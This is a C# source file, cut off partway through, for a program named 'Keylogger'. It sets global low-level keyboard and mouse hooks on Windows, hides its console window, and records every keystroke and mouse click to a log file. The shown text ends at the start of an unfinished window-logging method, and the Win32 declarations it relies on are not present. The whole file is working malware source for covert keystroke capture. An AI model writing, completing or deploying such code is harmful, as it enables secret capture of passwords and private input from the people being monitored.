using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Keylogger
{
    class Program
    {
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static LowLevelMouseProc _mouseProc = MouseHookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static IntPtr _mouseHookID = IntPtr.Zero;

        private static string _logFile = "log.txt";
        private static bool _hiddenMode = true;

        static void Main(string[] args)
        {
            _hookID = SetHook(_proc);
            _mouseHookID = SetMouseHook(_mouseProc);

            if (_hiddenMode)
            {
                var handle = GetConsoleWindow();
                ShowWindow(handle, SW_HIDE);
            }

            Application.Run();

            UnhookWindowsHookEx(_hookID);
            UnhookWindowsHookEx(_mouseHookID);
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private delegate IntPtr LowLevelMouseProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (var curProcess = Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr SetMouseHook(LowLevelMouseProc proc)
        {
            using (var curProcess = Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_MOUSE_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            LogActiveWindow();

            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                var key = (Keys)vkCode;
                string log = key.ToString();
                File.AppendAllText(_logFile, log);

                if (_hiddenMode)
                {
                    Console.WriteLine(log);
                }
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static IntPtr MouseHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && (wParam == (IntPtr)WM_LBUTTONDOWN || wParam == (IntPtr)WM_RBUTTONDOWN || wParam == (IntPtr)WM_MBUTTONDOWN))
            {
                var button = "";
                switch (wParam)
                {
                    case (IntPtr)WM_LBUTTONDOWN:
                        button = "LEFT";
                        break;
                    case (IntPtr)WM_RBUTTONDOWN:
                        button = "RIGHT";
                        break;
                    case (IntPtr)WM_MBUTTONDOWN:
                        button = "MIDDLE";
                        break;
                }

                var click = $"[MOUSE {button} CLICK]\n";
                File.AppendAllText(_logFile, click);

                if (_hiddenMode)
                {
                    Console.WriteLine(click);
                }
            }

            return CallNextHookEx(_mouseHookID, nCode, wParam, lParam);
        }

        private static void LogActiveWindow()
